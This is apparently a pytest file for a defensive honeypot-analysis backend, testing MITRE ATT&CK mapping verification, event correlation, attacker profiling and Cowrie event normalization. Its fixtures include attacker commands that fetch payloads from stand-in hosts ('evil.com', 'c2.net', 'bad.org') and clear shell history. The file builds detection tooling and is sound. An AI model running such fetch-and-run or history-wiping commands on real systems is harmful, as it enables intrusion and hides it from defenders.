import pytest
from datetime import datetime, timezone, timedelta
from backend.app.models.telemetry import TelemetryEventDB, TelemetryEventCreate
from backend.app.models.session import InvestigationSessionDB
from backend.app.services.mitre_verification import (
    verify_technique_mapping,
    VerificationStatus,
    ObservationType
)
from backend.app.services.correlation import (
    correlate_events,
    correlate_single_event,
    analyze_session_attack_sequence
)
from backend.app.services.profiling import build_attacker_profile, list_attacker_profiles
from backend.app.services.graph import build_investigation_graph

# 1. MITRE Verification: SUPPORTED cases
def test_mitre_mapping_verification_supported():
    # User discovery
    v_user = verify_technique_mapping(
        candidate_technique_id="T1033",
        event_type="command_execution",
        payload="whoami",
        supporting_event_ids=["evt-1"]
    )
    assert v_user.verification_status == VerificationStatus.SUPPORTED
    assert v_user.official_technique_name == "System Owner/User Discovery"
    assert v_user.observation_type == ObservationType.DIRECT_OBSERVATION
    assert not v_user.is_sub_technique
    assert v_user.parent_technique_id is None

    # Ingress tool transfer
    v_tool = verify_technique_mapping(
        candidate_technique_id="T1105",
        event_type="command_execution",
        payload="curl -O http://evil.com/payload.sh",
        supporting_event_ids=["evt-2"]
    )
    assert v_tool.verification_status == VerificationStatus.SUPPORTED
    assert "Ingress Tool Transfer" in v_tool.official_technique_name

    # Cron persistence (sub-technique)
    v_cron = verify_technique_mapping(
        candidate_technique_id="T1053.003",
        event_type="command_execution",
        payload="crontab -e",
        supporting_event_ids=["evt-3"]
    )
    assert v_cron.verification_status == VerificationStatus.SUPPORTED
    assert v_cron.is_sub_technique
    assert v_cron.parent_technique_id == "T1053"

# 2. MITRE Verification: NEEDS_MORE_EVIDENCE cases
def test_mitre_mapping_verification_needs_more_evidence():
    # Single isolated auth failure without sequence or tool evidence
    v_fail = verify_technique_mapping(
        candidate_technique_id="T1110.001",
        event_type="auth_failure",
        payload="Failed password for admin",
        event_count=1
    )
    assert v_fail.verification_status == VerificationStatus.NEEDS_MORE_EVIDENCE
    assert len(v_fail.missing_evidence) > 0
    assert len(v_fail.alternative_explanations) > 0

    # Generic network probe trying to claim T1046
    v_net = verify_technique_mapping(
        candidate_technique_id="T1046",
        event_type="tcp_connect",
        payload="syn packet"
    )
    assert v_net.verification_status == VerificationStatus.NEEDS_MORE_EVIDENCE

# 3. MITRE Verification: REJECTED cases
def test_mitre_mapping_verification_rejected():
    # Non-existent technique ID
    v_invalid = verify_technique_mapping(
        candidate_technique_id="T9999.999",
        event_type="command_execution",
        payload="whoami"
    )
    assert v_invalid.verification_status == VerificationStatus.REJECTED
    assert "does not exist" in v_invalid.mapping_rationale

    # Mismatched tactic
    v_tactic = verify_technique_mapping(
        candidate_technique_id="T1033",
        event_type="command_execution",
        payload="whoami",
        claimed_tactic="Exfiltration"
    )
    assert v_tactic.verification_status == VerificationStatus.REJECTED
    assert "invalid for T1033" in v_tactic.mapping_rationale

    # Contradictory evidence: claiming Valid Accounts on a failed login
    v_contra = verify_technique_mapping(
        candidate_technique_id="T1078",
        event_type="auth_failure",
        payload="Failed password"
    )
    assert v_contra.verification_status == VerificationStatus.REJECTED

# 4. Multi-Stage Attack Sequence Analysis
def test_multi_stage_attack_sequence_analysis(db_session):
    now = datetime.now(timezone.utc)
    sess_id = "sess-multi-stage-001"

    # Create sequence of events: Failures -> Login -> Discovery -> Download -> Cron -> Cleanup
    events_data = [
        {"event_id": "ev-s1", "event_type": "auth_failure", "payload": "failed", "username": "admin", "delta": 0},
        {"event_id": "ev-s2", "event_type": "auth_failure", "payload": "failed", "username": "admin", "delta": 5},
        {"event_id": "ev-s3", "event_type": "auth_success", "payload": "accepted password", "username": "admin", "delta": 10},
        {"event_id": "ev-s4", "event_type": "command_execution", "payload": "whoami && uname -a", "username": "admin", "delta": 15},
        {"event_id": "ev-s5", "event_type": "command_execution", "payload": "curl -O http://c2.net/bot", "username": "admin", "delta": 20},
        {"event_id": "ev-s6", "event_type": "command_execution", "payload": "crontab -l", "username": "admin", "delta": 25},
        {"event_id": "ev-s7", "event_type": "command_execution", "payload": "history -c", "username": "admin", "delta": 30},
    ]

    for ed in events_data:
        db_ev = TelemetryEventDB(
            event_id=ed["event_id"],
            session_id=sess_id,
            source_ip="198.51.100.88",
            timestamp=now + timedelta(seconds=ed["delta"]),
            event_type=ed["event_type"],
            payload=ed["payload"],
            username=ed["username"],
            data_origin="real"
        )
        db_session.add(db_ev)
    db_session.commit()

    # Correlate session
    correlate_events(db_session)

    # Analyze attack sequence
    seq_analysis = analyze_session_attack_sequence(sess_id, db_session)
    assert seq_analysis is not None
    assert seq_analysis["session_id"] == sess_id
    assert seq_analysis["total_events"] == 7
    assert len(seq_analysis["identified_stages"]) >= 3
    assert len(seq_analysis["missing_stages"]) > 0
    assert "temporal co-occurrence" in seq_analysis["correlation_explanation"]
    assert len(seq_analysis["chronological_timeline"]) == 7

# 5. Attacker Behavior Profiling
def test_attacker_behavior_profiling(db_session):
    ip = "203.0.113.199"
    now = datetime.now(timezone.utc)

    for i in range(3):
        db_ev = TelemetryEventDB(
            event_id=f"ev-prof-{i}",
            source_ip=ip,
            timestamp=now + timedelta(seconds=i * 10),
            event_type="command_execution",
            payload="curl http://bad.org/script.sh" if i == 0 else "whoami",
            data_origin="real",
            mitre_technique_id="T1105" if i == 0 else "T1033"
        )
        db_session.add(db_ev)
    db_session.commit()

    profile = build_attacker_profile(ip, db_session)
    assert profile is not None
    assert profile["source_ip"] == ip
    assert profile["total_events"] == 3
    assert len(profile["verified_techniques"]) >= 1
    assert "does not prove the legal identity" in profile["missing_evidence_and_uncertainty"]

    all_profiles = list_attacker_profiles(db_session)
    assert any(p["source_ip"] == ip for p in all_profiles)

# 6. Investigation Graph & Story Generation
def test_graph_investigation_story(db_session):
    ip = "192.0.2.77"
    sess_id = "sess-graph-story-01"
    now = datetime.now(timezone.utc)

    db_ev = TelemetryEventDB(
        event_id="ev-graph-1",
        session_id=sess_id,
        source_ip=ip,
        timestamp=now,
        event_type="auth_failure",
        payload="failed login",
        data_origin="real"
    )
    db_session.add(db_ev)
    db_session.commit()

    correlate_events(db_session)

    graph_res = build_investigation_graph(db_session, session_id=sess_id)
    assert "investigation_story" in graph_res
    story = graph_res["investigation_story"]
    assert "what_was_observed_first" in story
    assert "what_happened_next" in story
    assert "which_events_appear_related" in story
    assert "what_suspicious_behaviors_were_identified" in story
    assert "which_attack_techniques_were_considered" in story
    assert "which_mappings_were_supported_or_rejected" in story
    assert "why_were_alerts_generated" in story
    assert "what_remains_uncertain" in story

# 7. End-to-End Ingestion, Verification, and Profiling via API
def test_end_to_end_api_endpoints(client, db_session):
    # Ingest event
    ingest_payload = {
        "source_ip": "198.51.100.99",
        "event_type": "command_execution",
        "payload": "whoami",
        "data_origin": "real"
    }
    resp = client.post("/api/events", json=ingest_payload)
    assert resp.status_code == 201
    event_data = resp.json()
    e_id = event_data["event_id"]

    # Verify event technique endpoint
    v_resp = client.get(f"/api/events/{e_id}/verify")
    assert v_resp.status_code == 200
    v_data = v_resp.json()
    assert v_data["candidate_technique_id"] == "T1033"
    assert v_data["verification_status"] == "SUPPORTED"

    # Profile endpoint
    p_resp = client.get("/api/profiles/198.51.100.99")
    assert p_resp.status_code == 200
    p_data = p_resp.json()
    assert p_data["source_ip"] == "198.51.100.99"
    assert p_data["total_events"] >= 1

    # Graph story endpoint
    story_resp = client.get("/api/graph/story?source_ip=198.51.100.99")
    assert story_resp.status_code == 200
    story_data = story_resp.json()
    assert "what_was_observed_first" in story_data

# 8. Honeynet Field Normalization Aliases (Cowrie compatibility)
def test_honeynet_field_normalization_aliases(client):
    cowrie_format_event = {
        "src_ip": "185.220.101.44",
        "dst_ip": "10.0.0.5",
        "src_port": 54321,
        "dst_port": 2222,
        "event_type": "command_execution",
        "command": "uname -a",
        "data_origin": "real"
    }
    resp = client.post("/api/events", json=cowrie_format_event)
    assert resp.status_code == 201
    data = resp.json()
    assert data["source_ip"] == "185.220.101.44"
    assert data["destination_ip"] == "10.0.0.5"
    assert data["source_port"] == 54321
    assert data["destination_port"] == 2222
    assert data["payload"] == "uname -a"
    assert data["mitre_technique_id"] == "T1082"
